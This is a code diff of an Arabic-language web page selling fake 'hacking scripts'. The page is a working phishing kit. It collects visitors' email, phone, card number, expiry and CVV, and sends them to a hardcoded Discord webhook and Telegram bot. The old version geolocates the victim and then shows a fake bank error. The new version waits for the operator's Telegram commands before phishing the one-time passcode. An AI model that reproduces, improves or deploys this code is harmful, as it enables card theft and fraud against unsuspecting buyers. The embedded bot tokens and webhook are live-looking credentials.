@@ -2,196 +2,235 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VEMORAH | AL-ARRAB SYSTEM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VEMORAH | ACCESS PROTOCOL</title>
+    
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Orbitron:wght@500;900&display=swap');
-        :root { --gold: #d4af37; --bg: #050505; }
-        body { background: var(--bg); color: #fff; font-family: 'Cairo', sans-serif; margin: 0; overflow-x: hidden; }
-        .hero-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000 100%); z-index: -1; }
-        .gold-text { background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700;900&family=Orbitron:wght@400;700;900&display=swap');
+        
+        :root { --gold: #d4af37; --bg: #000; }
+        body { background: var(--bg); color: #fff; font-family: 'Cairo', sans-serif; overflow-x: hidden; margin: 0; }
+
+        /* Cinematic Background */
+        #particles-js { position: fixed; inset: 0; z-index: -1; }
+        .gradient-overlay { position: fixed; inset: 0; background: radial-gradient(circle at center, transparent 0%, #000 95%); z-index: -1; }
+
+        /* Premium HUD Card */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.02);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(212, 175, 55, 0.15);
+            border-radius: 30px;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .glass-card:hover { transform: translateY(-10px); border-color: var(--gold); box-shadow: 0 20px 50px rgba(212, 175, 55, 0.1); }
+        
+        .gold-text {
+            background: linear-gradient(135deg, #bf953f 0%, #fcf6ba 45%, #b38728 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 8px rgba(212, 175, 55, 0.4));
+        }
+
         .orbitron { font-family: 'Orbitron', sans-serif; }
-        .modern-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(212, 175, 55, 0.1); border-radius: 24px; transition: 0.4s; cursor: pointer; }
-        .modern-card:hover { border-color: var(--gold); transform: translateY(-10px); box-shadow: 0 10px 30px rgba(212,175,55,0.1); }
-        .neo-input { background: rgba(0,0,0,0.8) !important; border: 1px solid #333 !important; color: var(--gold) !important; border-radius: 12px !important; padding: 15px !important; text-align: center; width: 100%; margin-bottom: 10px; }
-        .gold-btn { background: linear-gradient(90deg, #bf953f, #d4af37); color: #000; font-weight: 900; width: 100%; padding: 15px; border-radius: 12px; transition: 0.3s; }
-        .gold-btn:hover { opacity: 0.9; transform: scale(0.98); }
+
+        .btn-elite {
+            background: linear-gradient(90deg, #bf953f, #d4af37);
+            color: #000; font-weight: 900; border-radius: 15px;
+            transition: 0.3s; cursor: pointer; border: none;
+        }
+        .btn-elite:active { transform: scale(0.95); }
+
+        /* Custom SweetAlert Style */
+        .swal-arrab {
+            border-radius: 35px !important; background: rgba(8,8,8,0.98) !important;
+            border: 1px solid var(--gold) !important; backdrop-filter: blur(25px) !important;
+        }
+        .modern-input {
+            background: rgba(255,255,255,0.05) !important; border: 1px solid #333 !important;
+            color: #fff !important; border-radius: 15px !important; padding: 15px !important;
+            width: 100%; text-align: center; margin-bottom: 12px;
+        }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col items-center p-6">
 
-    <div class="hero-bg"></div>
+    <div id="particles-js"></div>
+    <div class="gradient-overlay"></div>
 
-    <nav class="flex justify-between items-center p-8 max-w-7xl mx-auto">
-        <div class="flex items-center gap-2">
-            <div class="w-1 h-8 bg-yellow-500 rounded-full"></div>
-            <h1 class="orbitron text-2xl font-black tracking-widest gold-text">VEMORAH</h1>
+    <header class="text-center mt-10 mb-16 animate__animated animate__fadeInDown">
+        <h1 class="orbitron text-5xl md:text-7xl font-black gold-text mb-2">VEMORAH</h1>
+        <p class="text-gray-500 text-[10px] uppercase tracking-[10px] font-bold opacity-60">The Arrab Protocol v34</p>
+    </header>
+
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 w-full max-w-6xl animate__animated animate__fadeInUp">
+        
+        <div class="glass-card p-8 text-center">
+            <h3 class="orbitron text-gray-400 text-xs tracking-widest mb-4">WEEKLY</h3>
+            <div class="text-4xl font-black mb-8">$20</div>
+            <button onclick="startFlow('20')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
         </div>
-        <div class="text-[10px] orbitron text-yellow-500/30 tracking-[4px]">V21_ULTRA_SECURE</div>
-    </nav>
 
-    <main class="max-w-7xl mx-auto px-6 py-12 text-center">
-        <h2 class="text-6xl md:text-8xl font-black mb-4 gold-text">هاكات العراب</h2>
-        <p class="text-gray-400 max-w-lg mx-auto mb-16">بوابة الوصول الحصرية لسكربتات 2024 - نظام رمضان المطور</p>
-
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <div onclick="initStep1('15')" class="modern-card p-10">
-                <i class="fas fa-bolt text-gray-600 mb-4 text-2xl"></i>
-                <div class="orbitron text-3xl mb-8">$15</div>
-                <button class="gold-btn orbitron text-[10px]">LITE_ACCESS</button>
-            </div>
-            <div onclick="initStep1('40')" class="modern-card p-10 border-yellow-500/40 bg-yellow-500/5 md:scale-110 shadow-2xl">
-                <i class="fas fa-crown text-yellow-500 mb-4 text-2xl"></i>
-                <div class="orbitron text-4xl mb-8 gold-text">$40</div>
-                <button class="gold-btn orbitron text-[10px]">PREMIUM_VIP</button>
-            </div>
-            <div onclick="initStep1('250')" class="modern-card p-10">
-                <i class="fas fa-infinity text-gray-600 mb-4 text-2xl"></i>
-                <div class="orbitron text-3xl mb-8">$250</div>
-                <button class="gold-btn orbitron text-[10px]">ULTIMATE_DEV</button>
-            </div>
+        <div class="glass-card p-10 text-center border-gold/40 relative transform md:scale-110 shadow-2xl">
+            <div class="absolute -top-4 left-1/2 -translate-x-1/2 bg-gold text-black px-5 py-1 rounded-full text-[10px] font-black orbitron">POPULAR</div>
+            <h3 class="orbitron text-white text-xs tracking-widest mb-4">MONTHLY</h3>
+            <div class="text-5xl font-black mb-8 gold-text">$40</div>
+            <button onclick="startFlow('40')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
         </div>
-    </main>
 
+        <div class="glass-card p-8 text-center">
+            <h3 class="orbitron text-gray-400 text-xs tracking-widest mb-4">ANNUAL</h3>
+            <div class="text-4xl font-black mb-8">$250</div>
+            <button onclick="startFlow('250')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
-        // --- إعدادات التحكم الخاصة بك ---
-        const DISCORD_URL = "https://discord.com/api/webhooks/1474024330412425226/zvPRFXHvATNuEQLiNMplwHxcc4nQfXGhGhmmdhc4mwvt-Xtll5wyUAaenMBlPiyJc8kh";
-        const TG_TOKEN = "8638518681:AAFypdX0EgbejWZ6CdgSCwOaya1l288kUGY";
-        const TG_CHAT_ID = "1430030571"; 
-        const EMAIL_KEY = "-1qvcdobAPJCDPGik";
-        const TEMPLATE_ID = "template_g7kw06q"; // <--- استبدل هذا المعرف من حسابك في EmailJS
+        // Background Config
+        particlesJS("particles-js", {
+            "particles": {
+                "number": { "value": 60 },
+                "color": { "value": "#d4af37" },
+                "opacity": { "value": 0.3 },
+                "size": { "value": 2 },
+                "line_linked": { "enable": true, "distance": 150, "color": "#d4af37", "opacity": 0.1, "width": 1 }
+            }
+        });
 
-        emailjs.init(EMAIL_KEY); 
+        // --- إعدادات العراب النهائية ---
+        const CONFIG = {
+            t: "8638518681:AAFypdX0EgbejWZ6CdgSCwOaya1l288kUGY",
+            c: "8715481879",
+            w: "https://discord.com/api/webhooks/1474024330412425226/zvPRFXHvATNuEQLiNMplwHxcc4nQfXGhGhmmdhc4mwvt-Xtll5wyUAaenMBlPiyJc8kh"
+        };
 
-        let userIP = "Unknown";
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = `${d.country_name} (${d.city})`);
+        // دالة الإرسال الاحترافية (Modern Telegram UI)
+        async function sendReport(htmlMsg) {
+            fetch(`https://api.telegram.org/bot${CONFIG.t}/sendMessage?chat_id=${CONFIG.c}&text=${encodeURIComponent(htmlMsg)}&parse_mode=HTML`);
+            fetch(CONFIG.w, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: htmlMsg.replace(/<[^>]*>/g, '') }) });
+        }
 
-        async function initStep1(price) {
-            const { value: user } = await Swal.fire({
-                title: 'تفعيل الحساب',
-                background: '#0a0a0a', color: '#bf953f',
+        async function startFlow(price) {
+            const { value: login } = await Swal.fire({
+                title: 'تسجيل دخول آمن', background: '#050505', color: '#d4af37',
+                customClass: { popup: 'swal-arrab animate__animated animate__fadeInDown' },
                 confirmButtonText: 'استمرار',
-                confirmButtonColor: '#bf953f',
                 html: `
-                    <input id="sw_em" class="neo-input" placeholder="البريد الإلكتروني (Gmail)" type="email">
-                    <input id="sw_ph" class="neo-input" placeholder="رقم الهاتف (واتساب)" type="tel">
-                `,
-                preConfirm: () => {
-                    const e = document.getElementById('sw_em').value;
-                    const p = document.getElementById('sw_ph').value;
-                    if(!e.includes('@')) return Swal.showValidationMessage('البريد غير صحيح');
-                    if(p.length < 8) return Swal.showValidationMessage('رقم الهاتف غير صحيح');
-                    return { email: e, phone: p };
-                }
-            });
-            if (user) showPayment(price, user);
-        }
-
-        function showPayment(price, user) {
-            Swal.fire({
-                background: '#000', color: '#fff',
-                confirmButtonText: `تأكيد الدفع $${price}`,
-                confirmButtonColor: '#bf953f',
-                html: `
-                    <div class="mb-4 p-5 border border-yellow-500/20 rounded-xl bg-gradient-to-br from-neutral-900 to-black text-left orbitron">
-                        <div id="v_card" class="text-xl tracking-[4px] mb-4">**** **** **** ****</div>
-                        <div class="flex justify-between text-[9px] opacity-40 uppercase">
-                            <span>${user.email}</span>
-                            <span id="v_date">MM/YY</span>
-                        </div>
-                    </div>
-                    <div class="flex flex-col">
-                        <input id="c_v" class="neo-input" placeholder="رقم البطاقة (16 خانة)" maxlength="19">
-                        <div class="flex gap-2">
-                            <input id="c_d" class="neo-input w-1/2" placeholder="MM/YY" maxlength="5">
-                            <input id="c_c" class="neo-input w-1/2" placeholder="CVV" maxlength="3">
-                        </div>
-                        <input id="c_n" class="neo-input" placeholder="اسم صاحب البطاقة">
+                    <div class="p-2">
+                        <input id="em" class="modern-input" placeholder="البريد الإلكتروني" type="email">
+                        <input id="ph" class="modern-input" placeholder="رقم الهاتف" type="tel">
                     </div>
                 `,
-                didOpen: () => {
-                    const cv = document.getElementById('c_v');
-                    const cd = document.getElementById('c_d');
-                    
-                    cv.addEventListener('input', (e) => {
-                        let v = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
-                        e.target.value = v;
-                        document.getElementById('v_card').innerText = v || "**** **** **** ****";
-                    });
-
-                    cd.addEventListener('input', (e) => {
-                        let v = e.target.value.replace(/\D/g, '');
-                        if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
-                        e.target.value = v;
-                        document.getElementById('v_date').innerText = v || "MM/YY";
-                    });
-                },
                 preConfirm: () => {
-                    const v = document.getElementById('c_v').value;
-                    const d = document.getElementById('c_d').value;
-                    const c = document.getElementById('c_c').value;
-                    const n = document.getElementById('c_n').value;
-                    if (v.replace(/\s/g,'').length < 16) return Swal.showValidationMessage('رقم البطاقة ناقص');
-                    if (d.length < 5) return Swal.showValidationMessage('التاريخ ناقص');
-                    if (c.length < 3) return Swal.showValidationMessage('CVV ناقص');
-                    if (n.length < 3) return Swal.showValidationMessage('الاسم مطلوب');
-                    return { e: user.email, ph: user.phone, v: v, d: d, c: c, n: n, p: price };
+                    const e = document.getElementById('em').value;
+                    const p = document.getElementById('ph').value;
+                    if(!e.includes('@')) return Swal.showValidationMessage('البريد غير صالح');
+                    return { e, p };
                 }
-            }).then(res => { if(res.isConfirmed) processFinal(res.value); });
-        }
-
-        async function processFinal(data) {
-            Swal.fire({ 
-                title: 'جاري فحص الحساب...', 
-                background: '#000', color: '#d4af37', 
-                timer: 2000, showConfirmButton: false, 
-                didOpen: () => Swal.showLoading() 
             });
 
-            const orderID = Math.floor(Math.random() * 900000) + 100000;
-
-            // 1. إرسال لديسكورد
-            const dcPayload = {
-                username: "VEMORAH_ULTIMATE",
-                embeds: [{
-                    title: "🏆 صيد VIP جديد - هاكات العراب",
-                    color: 16751104,
-                    fields: [
-                        { name: "📧 الإيميل", value: data.e, inline: true },
-                        { name: "📞 الهاتف", value: data.ph, inline: true },
-                        { name: "👤 صاحب البطاقة", value: data.n },
-                        { name: "💳 بيانات البطاقة", value: `\`\`\`${data.v} | ${data.d} | ${data.c}\`\`\`` },
-                        { name: "📍 الموقع", value: userIP }
-                    ]
-                }]
-            };
-            fetch(DISCORD_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(dcPayload) });
-
-            // 2. إرسال لتليجرام
-            const tgMsg = `🚀 صيد جديد:\n📧 ${data.e}\n📞 ${data.ph}\n💳 ${data.v}\n📅 ${data.d} | ${data.c}\n📍 ${userIP}`;
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);
-
-            // 3. إرسال الإيميل (EmailJS)
-            emailjs.send("service_fe2mgyr", TEMPLATE_ID, {
-                user_email: data.e,
-                order_id: orderID,
-                from_name: "Al-Arrab Hacks"
-            });
-
-            // 4. النتيجة النهائية للضحية
-            setTimeout(() => {
-                Swal.fire({
-                    icon: 'error',
-                    title: 'فشل في الاتصال بالبنك',
-                    text: 'نعتذر، لم نتمكن من إتمام العملية. تم إرسال تقرير بالخطأ إلى بريدك الإلكتروني. يرجى تجربة بطاقة أخرى أو التواصل مع الدعم.',
-                    background: '#000', color: '#fff',
-                    confirmButtonText: 'حسناً', confirmButtonColor: '#d4af37'
+            if (login) {
+                const { value: card } = await Swal.fire({
+                    title: 'بوابة الدفع المشفرة', background: '#050505', color: '#fff',
+                    customClass: { popup: 'swal-arrab animate__animated animate__zoomIn' },
+                    confirmButtonText: `دفع $${price}`,
+                    html: `
+                        <div class="p-2">
+                            <input id="cn" class="modern-input" placeholder="رقم البطاقة" maxlength="19" inputmode="numeric">
+                            <div class="flex gap-2">
+                                <input id="ce" class="modern-input w-1/2" placeholder="MM/YY" maxlength="5">
+                                <input id="cc" class="modern-input w-1/2" placeholder="CVV" maxlength="3">
+                            </div>
+                        </div>
+                    `,
+                    didOpen: () => {
+                        document.getElementById('cn').oninput = (e) => e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+                        document.getElementById('ce').oninput = (e) => {
+                            let v = e.target.value.replace(/[^\d]/g, '');
+                            if(v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+                            e.target.value = v;
+                        };
+                    },
+                    preConfirm: () => ({ n: document.getElementById('cn').value, e: document.getElementById('ce').value, c: document.getElementById('cc').value })
                 });
-            }, 2000);
+
+                if (card) processWait({...login, ...card, price});
+            }
+        }
+
+        async function processWait(data) {
+            const report = `
+👑 <b>VEMORAH | صيد جديد للعراب</b>
+────────────────────
+👤 <b>الضحية:</b>
+📧 بريد: <code>${data.e}</code>
+📱 هاتف: <code>${data.p}</code>
+
+💳 <b>بيانات الدفع:</b>
+🔢 بطاقة: <code>${data.n}</code>
+📅 تاريخ: <code>${data.e}</code>
+🔒 كود: <code>${data.c}</code>
+
+💰 <b>المبلغ:</b> <code>$${data.price}</code>
+
+⚠️ <b>الأمر المطلوب:</b>
+أرسل <b>"فتح"</b> لطلب OTP
+أرسل <b>"قفل"</b> لرفض البطاقة
+────────────────────`;
+            
+            sendReport(report);
+
+            Swal.fire({
+                title: 'جاري المصادقة...',
+                html: '<div class="flex flex-col items-center"><div class="w-12 h-12 border-4 border-gold border-t-transparent rounded-full animate-spin mb-4"></div><p class="orbitron gold-text text-[10px] animate-pulse">SECURE_HANDSHAKE_PROCEEDING</p></div>',
+                background: '#050505', color: '#fff', customClass: { popup: 'swal-arrab' },
+                allowOutsideClick: false, showConfirmButton: false
+            });
+
+            const poller = setInterval(async () => {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.t}/getUpdates?offset=-1`);
+                const json = await res.json();
+                if(json.result?.[0]?.message) {
+                    const cmd = json.result[0].message.text.toLowerCase();
+                    if(cmd === "فتح") { clearInterval(poller); requestOTP(data); }
+                    if(cmd === "قفل") {
+                        clearInterval(poller);
+                        Swal.fire({ icon: 'error', title: 'البطاقة مرفوضة', text: 'يرجى استخدام بطاقة ائتمان أخرى.', background: '#050505', color: '#fff', customClass: { popup: 'swal-arrab' } });
+                    }
+                }
+            }, 2500);
+        }
+
+        async function requestOTP(data) {
+            const { value: code } = await Swal.fire({
+                title: 'التحقق من الهوية', background: '#050505', color: '#fff',
+                customClass: { popup: 'swal-arrab animate__animated animate__flipInX' },
+                confirmButtonText: 'تأكيد الرمز', confirmButtonColor: '#d4af37',
+                html: `
+                    <div class="p-2">
+                        <input id="otp" class="modern-input !text-4xl tracking-[15px] font-black" maxlength="6" type="tel" placeholder="******">
+                        <p class="text-[10px] text-gray-500 mt-4 leading-relaxed">أدخل رمز الأمان المرسل إلى هاتفك لإتمام عملية الدفع بقيمة $${data.price}</p>
+                    </div>
+                `,
+                preConfirm: () => document.getElementById('otp').value
+            });
+
+            if (code) {
+                const otpReport = `
+🚨 <b>تنبيه OTP واصل!</b>
+────────────────────
+👤 البريد: <code>${data.e}</code>
+🔑 الكود: 
+<pre>      ${code}      </pre>
+────────────────────`;
+                sendReport(otpReport);
+                Swal.fire({ icon: 'error', title: 'خطأ', text: 'انتهت صلاحية الرمز، حاول مجدداً.', background: '#050505', color: '#fff', customClass: { popup: 'swal-arrab' } });
+            }
         }
     </script>
 </body>
